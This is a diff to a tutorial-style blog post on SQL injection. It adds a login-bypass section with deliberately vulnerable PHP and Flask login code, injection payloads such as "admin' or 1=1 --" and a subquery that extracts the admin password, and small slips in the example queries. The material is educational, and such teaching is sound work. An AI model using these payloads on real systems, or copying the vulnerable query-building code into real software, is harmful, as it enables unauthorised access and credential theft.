@@ -131,40 +131,120 @@ SQL injection are common in web applications and allow an attacker to execute SQ
 
 We are going to define a complete [threat model](https://owasp.org/www-community/Threat_Modeling), a detection process and patching/mitagation strategies in another post, here we will see just some the most common types their exploitation process, let's see a basic example.
 
-### simple SQLi
+### Simple SQLi & login bypass
 
-Let's see the simplest example of SQL injection.
-We have a simple login form:
+Let's see the simplest example of SQL injection and how we can use it to bypass the login process.
+Observing a login form like the following one
 ![simulation of binary search](/assets/images/form.png)
 
+we hardly can say anything about the backend it can be a php code like the following:
+
 ```php
-$host = "localhost";
-$user = "root";
-$pass = "";
-$dbname = "testdb";
+    $host = "localhost";
+    $user = "root";
+    $pass = "";
+    $dbname = "testdb";
 
-$conn = new mysqli($host, $user, $pass, $dbname);
+    $conn = new mysqli($host, $user, $pass, $dbname);
 
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
-}
+    if ($conn->connect_error) {
+        die("Connection failed: " . $conn->connect_error);
+    }
 
-$username = $_POST['username'];
-$password = $_POST['password'];
+    $user = $_POST['username'];
+    $pwd = $_POST['password'];
 
-//  start vulnerable code
-$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
-$result = $conn->query($sql);
+    //  start vulnerable code
+    $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pwd'";
+    $result = $conn->query($sql);
 
-if ($result && $result->num_rows > 0) {
-    echo "Login successful!";
-} else {
-    echo "Invalid credentials.";
-}
-//  end vulnerable code
-$conn->close();
-
+    if ($result && $result->num_rows > 0) {
+        echo "Login successful!";
+    } else {
+        echo "Invalid credentials.";
+    }
+    //  end vulnerable code
+    $conn->close();
 ```
+
+or a python-flask like the following one:
+
+```python
+    from flask import Flask, request
+    import sqlite3
+
+    app = Flask(__name__)
+
+    @app.route('/login', methods=['POST'])
+    def login():
+        user = request.form['username']
+        pwd = request.form['password']
+
+        conn = sqlite3.connect('test.db')
+        c = conn.cursor()
+
+        #   start vulnerable code
+        query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pwd}'"
+        c.execute(query)
+        result = c.fetchone()
+        #   end vulnerable code
+        
+        conn.close()
+        return "Logged in!" if result else "Invalid credentials."
+
+    if __name__ == "__main__":
+        app.run(debug=True)
+```
+
+or anything else but the key crucial point is that we can control the two inputs "user" and "pwd"
+so we can control the query executed on the database:
+
+```sql
+    SELECT * FROM users WHERE username = '$user' AND password = '$user'
+```
+
+If we have a normal behaviour, meaning that we insert "normals" (without ', ", # --) usernames and "normals" password anything goes as supposed: 
+
+```text
+user    =   admin
+pwd     =   12345678
+```
+
+is interpred by the SQL engine as:
+
+```sql
+    SELECT * FROM users WHERE username = 'admin' AND password = '12345678'
+```
+
+meaning that we will be logged in as admin just in case the password is 12345678 (not impossible scenario but highly improbable in modern systems).
+But since we have control over "user" and "pwd" inputs we can a payload to change the program logic flow.
+For example:
+
+```text
+user    =   admin' or 1=1 --
+pwd     =   12345678
+```
+
+is interpred by the SQL engine as:
+
+```sql
+    SELECT * FROM users WHERE username = 'admin' or 1=1 --' AND password = '12345678'
+```
+
+since `--` is the sql syntax means that everything after it is a comment the SQL engine will ignore all everythings that comes after.
+
+```text
+user    =   admin' or 1=1 --
+pwd     =   '+ (SELECT password FROM users where username = 'admin') +'
+```
+
+is interpred by the SQL engine as:
+
+```sql
+    SELECT * FROM users WHERE username = 'admin' or 1=1  AND password = ''+ (SELECT password FROM users where username = 'admin') +''
+```
+
+meaning that we manipulated the password field to be equal to itself using a subquery and concatenation operator.
 
 ### union based SQLi
 
